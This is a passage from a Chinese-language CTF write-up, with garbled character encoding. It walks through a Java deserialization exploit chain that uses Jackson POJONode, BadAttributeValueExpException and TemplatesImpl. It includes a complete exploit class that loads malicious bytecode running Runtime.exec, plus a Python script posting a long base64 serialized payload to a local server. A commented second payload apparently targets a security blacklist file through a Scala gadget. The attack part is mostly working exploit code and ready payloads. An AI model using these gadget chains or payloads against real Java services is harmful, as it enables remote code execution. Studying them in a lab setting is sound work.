&#125;</span><br></pre></td></tr></table></figure><p>æœ€åè°ƒç”¨ä¸ª_serializeï¼Œå†ä¸€è·¯è·Ÿè¿›å»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(JsonGenerator gen, SerializerProvider ctxt)</span> <span class="keyword">throws</span> IOException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (_value == <span class="literal">null</span>) &#123;</span><br><span class="line">            ctxt.defaultSerializeNull(gen);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (_value <span class="keyword">instanceof</span> JsonSerializable) &#123;</span><br><span class="line">            ((JsonSerializable) _value).serialize(gen, ctxt);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 25-May-2018, tatu: [databind#1991] do not call via generator but through context;</span></span><br><span class="line">            <span class="comment">//    this to preserve contextual information</span></span><br><span class="line">            ctxt.defaultSerializeValue(_value, gen);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object bean, JsonGenerator gen, SerializerProvider provider)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (_objectIdWriter != <span class="literal">null</span>) &#123;</span><br><span class="line">            gen.setCurrentValue(bean); <span class="comment">// [databind#631]</span></span><br><span class="line">            _serializeWithObjectId(bean, gen, provider, <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        gen.writeStartObject(bean);</span><br><span class="line">        <span class="keyword">if</span> (_propertyFilterId != <span class="literal">null</span>) &#123;</span><br><span class="line">            serializeFieldsFiltered(bean, gen, provider);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            serializeFields(bean, gen, provider);</span><br><span class="line">        &#125;</span><br><span class="line">        gen.writeEndObject();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±æ˜¯åˆ°äº†beanserializeräº†ï¼Œå†è·Ÿè¿›</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">serializeFields</span><span class="params">(Object bean, JsonGenerator gen, SerializerProvider provider)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">final</span> BeanPropertyWriter[] props;</span><br><span class="line">        <span class="keyword">if</span> (_filteredProps != <span class="literal">null</span> &amp;&amp; provider.getActiveView() != <span class="literal">null</span>) &#123;</span><br><span class="line">            props = _filteredProps;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            props = _props;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">final</span> <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> props.length; i &lt; len; ++i) &#123;</span><br><span class="line">                <span class="type">BeanPropertyWriter</span> <span class="variable">prop</span> <span class="operator">=</span> props[i];</span><br><span class="line">                <span class="keyword">if</span> (prop != <span class="literal">null</span>) &#123; <span class="comment">// can have nulls in filtered list</span></span><br><span class="line">                    prop.serializeAsField(bean, gen, provider);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (_anyGetterWriter != <span class="literal">null</span>) &#123;</span><br><span class="line">                _anyGetterWriter.getAndSerialize(bean, gen, provider);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (i == props.length) ? <span class="string">&quot;[anySetter]&quot;</span> : props[i].getName();</span><br><span class="line">            wrapAndThrow(provider, e, bean, name);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (StackOverflowError e) &#123;</span><br><span class="line">            <span class="comment">// 04-Sep-2009, tatu: Dealing with this is tricky, since we don&#x27;t have many</span></span><br><span class="line">            <span class="comment">//   stack frames to spare... just one or two; can&#x27;t make many calls.</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 10-Dec-2015, tatu: and due to above, avoid &quot;from&quot; method, call ctor directly:</span></span><br><span class="line">            <span class="comment">//JsonMappingException mapE = JsonMappingException.from(gen, &quot;Infinite recursion (StackOverflowError)&quot;, e);</span></span><br><span class="line">            <span class="type">DatabindException</span> <span class="variable">mapE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JsonMappingException</span>(gen, <span class="string">&quot;Infinite recursion (StackOverflowError)&quot;</span>, e);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (i == props.length) ? <span class="string">&quot;[anySetter]&quot;</span> : props[i].getName();</span><br><span class="line">            mapE.prependPath(bean, name);</span><br><span class="line">            <span class="keyword">throw</span> mapE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serializeAsField</span><span class="params">(Object bean, JsonGenerator gen,</span></span><br><span class="line"><span class="params">            SerializerProvider prov)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// inlined &#x27;get()&#x27;</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> (_accessorMethod == <span class="literal">null</span>) ? _field.get(bean)</span><br><span class="line">                : _accessorMethod.invoke(bean, (Object[]) <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">               </span><br></pre></td></tr></table></figure><p>è¿™æœ‰ä¸ªåå°„è§¦å‘invokeæ–¹æ³•ã€‚<br>æ¥åˆ°äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title function_">getOutputProperties</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ä¹‹åå°±æ˜¯æ‰“ä¸€ä¸ªå­—èŠ‚åŠ è½½æ¶æ„ç±»äº†ã€‚<br>payloadå¦‚ä¸‹æ„é€ ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.BaseJsonNode;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(evilref.class.getName());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        CtClass superClass = classPool.get(AbstractTranslet.class.getName());</span></span><br><span class="line"><span class="comment">//        ctClass.setSuperclass(superClass);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        CtConstructor constructor = new CtConstructor(new CtClass[]&#123;&#125;,ctClass);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        constructor.setBody(&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        ctClass.addConstructor(constructor);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = ctClass.toBytecode();</span><br><span class="line">        <span class="comment">//byte[][] codes = new byte[][]&#123;code&#125;;</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        ref(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        ref(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;shanghe&quot;</span>);</span><br><span class="line">        ref(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templates);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(exp,jsonNodes);</span><br><span class="line"></span><br><span class="line">        serialize_func.serialize(exp);</span><br><span class="line">        WriteToFileExample(serialize_func.encryptToBase64(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">WriteToFileExample</span><span class="params">(String args)</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> <span class="string">&quot;è¿™æ˜¯è¦å†™å…¥æ–‡ä»¶çš„å­—ç¬¦ä¸²å†…å®¹&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">BufferedWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="string">&quot;output.txt&quot;</span>));</span><br><span class="line">                writer.write(args);</span><br><span class="line">                writer.close();</span><br><span class="line">                System.out.println(<span class="string">&quot;å­—ç¬¦ä¸²å·²æˆåŠŸå†™å…¥æ–‡ä»¶ã€‚&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;å†™å…¥æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ï¼š&quot;</span> + e.getMessage());</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">ref</span><span class="params">(Object obj,String field,Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">reffield</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        reffield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        reffield.set(obj,value);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line"></span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserial</span><span class="params">(String data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(base64decodedBytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹è·¯ç”±ï¼Œä»–è¿™ä¸ªparamå‚æ•°æ˜¯ç›´æ¥è·å–bodyçš„ï¼Œä¸å¸¦é”®ã€‚<br>hackbaræä¸å®šï¼Œç”¨pythonæµ…æµ…å‘é€ä¸€ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="type">requests</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:2222/Hello/eyIiOnRydWUsImJhc2U2NENvZGUiOiJBQUFBQUFBQSJ9&quot;</span></span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&quot;param&quot;</span>:<span class="string">&quot;rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAAXNyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAKHQAA2V4cHQACGV4cC5qYXZhdAAEbWFpbnNyACZqYXZhLnV0aWwuQ29sbGVjdGlvbnMkVW5tb2RpZmlhYmxlTGlzdPwPJTG17I4QAgABTAAEbGlzdHEAfgAHeHIALGphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVDb2xsZWN0aW9uGUIAgMte9x4CAAFMAAFjdAAWTGphdmEvdXRpbC9Db2xsZWN0aW9uO3hwc3IAE2phdmEudXRpbC5BcnJheUxpc3R4gdIdmcdhnQMAAUkABHNpemV4cAAAAAB3BAAAAAB4cQB%2BABV4c3IALGNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5kYXRhYmluZC5ub2RlLlBPSk9Ob2RlAAAAAAAAAAICAAFMAAZfdmFsdWVxAH4AAXhyAC1jb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5WYWx1ZU5vZGUAAAAAAAAAAQIAAHhyADBjb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5CYXNlSnNvbk5vZGUAAAAAAAAAAQIAAHhwc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0%2FBbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAFTAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA%2F%2F%2F%2F%2F3VyAANbW0JL%2FRkVZ2fbNwIAAHhwAAAAAXVyAAJbQqzzF%2FgGCFTgAgAAeHAAAAYOyv66vgAAADQANQoACAAlCgAmACcIACgKACYAKQcAKgoABQArBwAsBwAtAQAGPGluaXQ%2BAQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAlMZXZpbHJlZjsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALgEAEE1ldGhvZFBhcmFtZXRlcnMBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACDxjbGluaXQ%2BAQABZQEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHACoBAApTb3VyY2VGaWxlAQAMZXZpbHJlZi5qYXZhDAAJAAoHAC8MADAAMQEABGNhbGMMADIAMwEAE2phdmEvaW8vSU9FeGNlcHRpb24MADQACgEAB2V2aWxyZWYBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAvAAEAAQAAAAUqtwABsQAAAAIADAAAAAYAAQAAAAkADQAAAAwAAQAAAAUADgAPAAAAAQAQABEAAwALAAAAPwAAAAMAAAABsQAAAAIADAAAAAYAAQAAABYADQAAACAAAwAAAAEADgAPAAAAAAABABIAEwABAAAAAQAUABUAAgAWAAAABAABABcAGAAAAAkCABIAAAAUAAAAAQAQABkAAwALAAAASQAAAAQAAAABsQAAAAIADAAAAAYAAQAAABsADQAAACoABAAAAAEADgAPAAAAAAABABIAEwABAAAAAQAaABsAAgAAAAEAHAAdAAMAFgAAAAQAAQAXABgAAAANAwASAAAAGgAAABwAAAAIAB4ACgABAAsAAABhAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAMADAAAABYABQAAAA0ACQAQAAwADgANAA8AEQARAA0AAAAMAAEADQAEAB8AIAAAACEAAAAHAAJMBwAiBAABACMAAAACACRwdAAHc2hhbmdoZXB3AQB4&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#string2 = <span class="string">&quot;rO0ABXNyADZzY2FsYS5jb2xsZWN0aW9uLmltbXV0YWJsZS5MYXp5TGlzdCRTZXJpYWxpemF0aW9uUHJveHkAAAAAAAAAAwMAAHhwc3IAJnNjYWxhLnJ1bnRpbWUuTW9kdWxlU2VyaWFsaXphdGlvblByb3h5AAAAAAAAAAECAAFMAAttb2R1bGVDbGFzc3QAEUxqYXZhL2xhbmcvQ2xhc3M7eHB2cgAmc2NhbGEuY29sbGVjdGlvbi5nZW5lcmljLlNlcmlhbGl6ZUVuZCQAAAAAAAAAAwIAAHhwc3IAI3NjYWxhLmNvbGxlY3Rpb24uaW1tdXRhYmxlLkxhenlMaXN0AAAAAAAAAAMDAAVaAAhiaXRtYXAkMFoADW1pZEV2YWx1YXRpb25aADNzY2FsYSRjb2xsZWN0aW9uJGltbXV0YWJsZSRMYXp5TGlzdCQkc3RhdGVFdmFsdWF0ZWRMAAlsYXp5U3RhdGV0ABFMc2NhbGEvRnVuY3Rpb24wO0wAKnNjYWxhJGNvbGxlY3Rpb24kaW1tdXRhYmxlJExhenlMaXN0JCRzdGF0ZXQAK0xzY2FsYS9jb2xsZWN0aW9uL2ltbXV0YWJsZS9MYXp5TGlzdCRTdGF0ZTt4cAAAAXNyAExzY2FsYS5zeXMucHJvY2Vzcy5Qcm9jZXNzQnVpbGRlckltcGwkRmlsZU91dHB1dCQkYW5vbmZ1biQkbGVzc2luaXQkZ3JlYXRlciQzAAAAAAAAAAACAAJaAAhhcHBlbmQkMUwABmZpbGUkMnQADkxqYXZhL2lvL0ZpbGU7eHAAc3IADGphdmEuaW8uRmlsZQQtpEUODeT/AwABTAAEcGF0aHQAEkxqYXZhL2xhbmcvU3RyaW5nO3hwdAAYLi9zZWN1cml0eS9ibGFja2xpc3QudHh0dwIAL3hzcQB+AAJ2cgAwc2NhbGEuY29sbGVjdGlvbi5pbW11dGFibGUuTGF6eUxpc3QkU3RhdGUkRW1wdHkkAAAAAAAAAAMCAAB4cHh4&quot;</span></span><br><span class="line">string = <span 